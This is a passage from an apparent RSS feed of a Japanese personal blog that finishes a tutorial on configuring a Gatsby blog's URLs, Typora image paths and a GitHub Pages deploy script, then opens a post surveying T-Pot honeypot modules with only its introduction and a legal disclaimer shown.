3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;記事のURLからディレクトリ名を削除する&lt;/h3&gt;
&lt;p&gt;デフォルトでは、記事のURLは以下の形式になります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;https://&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;カスタムドメイン&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;/&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;記事の存在するディレクトリ名&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;/&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;記事のSlug&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;URLに&lt;code class=&quot;language-text&quot;&gt;&amp;lt;記事の存在するディレクトリ名&gt;&lt;/code&gt;が埋まっていると、今後Markdownファイルのディレクトリを変更するたびにURLが変わってしまうのでよろしくありません。&lt;/p&gt;
&lt;p&gt;そのため、URLに&lt;code class=&quot;language-text&quot;&gt;&amp;lt;記事の存在するディレクトリ名&gt;&lt;/code&gt;が入らないように設定を変更します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;blog/gatsby/on-create-node.js&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;createNodeField&lt;/code&gt;を以下のように書き換えます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;node&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;internal&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;MarkdownRemark&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;typeof&lt;/span&gt; node&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frontmatter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;slug &lt;span class=&quot;token operator&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;undefined&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; dirname &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;getNode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;node&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;relativeDirectory&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;createNodeField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      node&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;slug&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token comment&quot;&gt;// value: `/${dirname}/${node.frontmatter.slug}`&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;node&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frontmatter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;slug&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでデプロイ時に生成されるURLからディレクトリ名を削除することができます。&lt;/p&gt;
&lt;h2 id=&quot;typoraの設定をする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#typora%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%82%92%E3%81%99%E3%82%8B&quot; aria-label=&quot;typoraの設定をする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Typoraの設定をする&lt;/h2&gt;
&lt;p&gt;僕が愛用しているTyporaというマークダウンエディタの非常に便利な機能の1つに、画像をコピペすると自動的に任意のローカルフォルダに保存してくれる機能があります。&lt;/p&gt;
&lt;p&gt;Gatsbyの場合&lt;code class=&quot;language-text&quot;&gt;blog/static/media&lt;/code&gt;配下の画像に対して&lt;code class=&quot;language-text&quot;&gt;/media&lt;/code&gt;でアクセスできます。&lt;/p&gt;
&lt;p&gt;そのため、以下のようにTyporaの設定で、コピペされた画像が&lt;code class=&quot;language-text&quot;&gt;blog/static/media&lt;/code&gt;配下の任意のディレクトリに配置されるように設定を行いました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/915fae9fa8c5853d16b68d568fce6fff/525d3/image-20220221222611109.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 47.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWklEQVQoz42S3VKDMBCFeaZaAuEnQKAhtKZYtZ3q2AsvHX3/2+NuWiJ16owX3wQ27Nmzu0RxViHOa8QZU3nu0tKfIq9C7L9EIlOIJQsoEjiLVp1FWjRB2CNVQNwQ4lwmSrICIs2RyCIIWrdDqQ3yqkNaagjVQugeyYUlvXN8TnDILjxc/RKUVYuMxBQlC/rYlQ0+V2t8rUd80HlIcii6LxqDol5RRwMas0FCXUWdHaGNQ91tgsOJJRVZEEat8Ebix7rDK3GiZGMdFAnp/p6Ee2+AnUb74zse9ye43dFXmM9D5A0EjWJhXqBGYthCrXfoxgMKbn3WVWhZ0jwW1MLPZuvglE+Oa/uAYfsMM4wY3BMaapsdTQbmi4muHV2LcQK7qGnrune0KHuhBxvh+wmfyzOcC0zPhobPm+ahs2BatihbGwpwXM42LRl6P/+HN9xNH0+Ffrf110/Nd9//6Vjt6iNuBQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/915fae9fa8c5853d16b68d568fce6fff/8ac56/image-20220221222611109.webp 240w,
/static/915fae9fa8c5853d16b68d568fce6fff/d3be9/image-20220221222611109.webp 480w,
/static/915fae9fa8c5853d16b68d568fce6fff/e46b2/image-20220221222611109.webp 960w,
/static/915fae9fa8c5853d16b68d568fce6fff/36bbb/image-20220221222611109.webp 1090w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/915fae9fa8c5853d16b68d568fce6fff/8ff5a/image-20220221222611109.png 240w,
/static/915fae9fa8c5853d16b68d568fce6fff/e85cb/image-20220221222611109.png 480w,
/static/915fae9fa8c5853d16b68d568fce6fff/d9199/image-20220221222611109.png 960w,
/static/915fae9fa8c5853d16b68d568fce6fff/525d3/image-20220221222611109.png 1090w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/915fae9fa8c5853d16b68d568fce6fff/d9199/image-20220221222611109.png&quot;
            alt=&quot;image-20220221222611109&quot;
            title=&quot;image-20220221222611109&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで、デプロイ時にブログページが適切な画像を参照できるようになります。&lt;/p&gt;
&lt;h2 id=&quot;github-pagesにデプロイする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#github-pages%E3%81%AB%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E3%81%99%E3%82%8B&quot; aria-label=&quot;github pagesにデプロイする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GitHub Pagesにデプロイする&lt;/h2&gt;
&lt;p&gt;さて、概ね形は整ったのでいよいよデプロイしていきます。&lt;/p&gt;
&lt;p&gt;基本的には公式の手順をベースにしています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.gatsbyjs.com/docs/how-to/previews-deploys-hosting/how-gatsby-works-with-github-pages/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;How Gatsby Works with GitHub Pages | Gatsby&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;まず必要なのは公開用のGithubリポジトリです。&lt;/p&gt;
&lt;p&gt;リポジトリの設定はパブリックにする必要があります。&lt;/p&gt;
&lt;p&gt;公開リポジトリにプッシュが完了したら、Github Pagesへのデプロイを始めていきます。&lt;/p&gt;
&lt;h3 id=&quot;パスの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%91%E3%82%B9%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;パスの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;パスの設定&lt;/h3&gt;
&lt;p&gt;今回はカスタムドメインを使用するので、&lt;code class=&quot;language-text&quot;&gt;blog\gatsby-config.js&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;pathPrefix&lt;/code&gt;に&lt;code class=&quot;language-text&quot;&gt;/&lt;/code&gt;を設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;module&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exports &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// pathPrefix: siteConfig.pathPrefix,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;pathPrefix&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これは、URLでアクセスする際に適切なパスを使えるようにするために必要な設定です。&lt;/p&gt;
&lt;p&gt;一方、カスタムドメインを指定しない場合は、&lt;code class=&quot;language-text&quot;&gt;pathPrefix&lt;/code&gt;にリポジトリ名を設定します。&lt;/p&gt;
&lt;h3 id=&quot;デプロイ用のカスタムスクリプトの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E7%94%A8%E3%81%AE%E3%82%AB%E3%82%B9%E3%82%BF%E3%83%A0%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;デプロイ用のカスタムスクリプトの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デプロイ用のカスタムスクリプトの作成&lt;/h3&gt;
&lt;p&gt;次にデプロイ用のスクリプトを設定します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;blog\package.json&lt;/code&gt;内の&lt;code class=&quot;language-text&quot;&gt;scripts&gt;deploy&lt;/code&gt;を以下のように設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token string-property property&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    
  &lt;span class=&quot;token string-property property&quot;&gt;&quot;deploy&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;rm -rf node_modules/.cache/gh-pages &amp;amp;&amp;amp; gatsby clean &amp;amp;&amp;amp; gatsby build --prefix-paths &amp;amp;&amp;amp; echo &apos;kashiwaba-yuki.com&apos; &gt; public/CNAME &amp;amp;&amp;amp; gh-pages -d public -b pages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;rm -rf node_modules/.cache/gh-pages&lt;/code&gt;は、ビルド時にエラーが発生しないよう、過去のキャッシュを削除しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;gatsby clean &amp;amp;&amp;amp; gatsby build --prefix-paths&lt;/code&gt;では、&lt;code class=&quot;language-text&quot;&gt;gatsby&lt;/code&gt;コマンドでコンテンツをビルドしています。&lt;/p&gt;
&lt;p&gt;変更内容を確実に反映させるために&lt;code class=&quot;language-text&quot;&gt;gatsby clean&lt;/code&gt;が必要です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;echo &apos;kashiwaba-yuki.com&apos; &gt; public/CNAME&lt;/code&gt;は、カスタムドメインを使用するためのCNAMEファイルを公開ディレクトリに配置するための記述です。&lt;/p&gt;
&lt;p&gt;これが無いとデプロイするたびにカスタムドメインが解除されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;gh-pages -d public -b pages&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;gh-pages&lt;/code&gt;を使って&lt;code class=&quot;language-text&quot;&gt;pages&lt;/code&gt;ブランチにビルドしたコンテンツを配置しています。&lt;/p&gt;
&lt;p&gt;Gitリポジトリにプッシュするため、コンテナ内からリポジトリにプッシュできるようにしておく必要があります。&lt;/p&gt;
&lt;h3 id=&quot;pagesの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#pages%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;pagesの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Pagesの設定&lt;/h3&gt;
&lt;p&gt;ここまで来たら後は簡単です。&lt;/p&gt;
&lt;p&gt;公開リポジトリの設定画面を開き、「Pages」で公開用のブランチ&lt;code class=&quot;language-text&quot;&gt;pages&lt;/code&gt;を指定してGtihub Pagesを公開します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f563b163d6bd711d854562d48559456d/dcccd/image-20220223010848772.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 62.916666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACDElEQVQ4y22Ty3LbMAxFtW0cvUVRoiTqLVuPpOOk6abLTL+gq35E/395C0C2x0m7OAMNRV5cgKATZxZuqIXHIJVobI+qmaCLDgdfEekF9V/cQN80nCgtRegqxqjqBG2PMFWPWFdQlFTlTI2ESIt2j6aRtes5EWyGFRkd9KKMMpFopBH0NbJlQvl0gtlmpOu2s8yIRxIlJE4NfTcIu1JwVQZHc7a7sllQNXTAVoiqCiERVJao6ZtiWcIvSnjGwMtzwadvxo3Joe1Od/1LxWlLrm07o7AjqvZEcPkDMkoeaws/bWlvjkfq6wdIwzF2EJH7PjbjhuP2Av5n+xklCXLfQhI7BJxcSfL73t16OM5fwWVHupTSg8SgOz5jfn5DQTfNlyYXQ80PdAMvqW7J7xFBdsgH/DhHqApxythuRjttJFbdNh8ukff6sUFA0SPcKBe3uzA57I5PyMpe3F0Pc4ksaKiHzTCjHlechgU99TPJ91FhQl3DU5/GJslqPHjJzYFHGctulXJDcs8tYKcJESlzN69cjf6nl05NmXlA94X9Z0DzlBZW1tl5chnomNzFZpD2ROmOH2cfLsnhoeZLuWb44oZ4//kHbz9+o11eMazfMa4vGJczhplYX1FPZ6SWXlM9X1joZU3SX0fK5fd4EXzwY5y//cK0vdOhI72iiRg+oGlNFQNUOe6RSEwrF/oXt29Oq5a0OpwAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f563b163d6bd711d854562d48559456d/8ac56/image-20220223010848772.webp 240w,
/static/f563b163d6bd711d854562d48559456d/d3be9/image-20220223010848772.webp 480w,
/static/f563b163d6bd711d854562d48559456d/e46b2/image-20220223010848772.webp 960w,
/static/f563b163d6bd711d854562d48559456d/0b154/image-20220223010848772.webp 1127w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f563b163d6bd711d854562d48559456d/8ff5a/image-20220223010848772.png 240w,
/static/f563b163d6bd711d854562d48559456d/e85cb/image-20220223010848772.png 480w,
/static/f563b163d6bd711d854562d48559456d/d9199/image-20220223010848772.png 960w,
/static/f563b163d6bd711d854562d48559456d/dcccd/image-20220223010848772.png 1127w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f563b163d6bd711d854562d48559456d/d9199/image-20220223010848772.png&quot;
            alt=&quot;image-20220223010848772&quot;
            title=&quot;image-20220223010848772&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;今回はCNAMEファイルも作成してカスタムドメインが有効になっているので、このドメインに接続すれば作成したブログを確認することができます。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;WordPressの旧ブログから順次こちらに移行していく予定です。&lt;/p&gt;
&lt;p&gt;画像とか内部リンクとかの修正を手動でやる必要があるのでかなり手間がかかりそうです。。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[続・新米ハニーポッターは安心安全にT-Potで遊びたい[T-Potのモジュールを全部調べてみた]]]></title><link>https://kashiwaba-yuki.com/honeypot-tpot-modules</link><guid isPermaLink="false">https://kashiwaba-yuki.com/honeypot-tpot-modules</guid><pubDate>Wed, 16 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;先日&lt;a href=&quot;/honeypot-setup-on-azure&quot;&gt;Azure上でハニーポットを構築する記事&lt;/a&gt;を書きましたが、今回はその続きです。&lt;/p&gt;
&lt;p&gt;実際にハニーポットの運用を始めるにあたって、前回インストールしたT-Potが動かしてるモジュールとハニーポットの概要について一通り確認しておくことにしました。&lt;/p&gt;
&lt;p&gt;T-Potに組み込まれているハニーポットは全部で25種類もあったので結構時間がかかりました笑&lt;/p&gt;
&lt;h2 id=&quot;記事について&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;記事について permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;記事について&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。&lt;/p&gt;
&lt;p&gt;またすべての発言は所属団体ではなく個人に帰属します。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
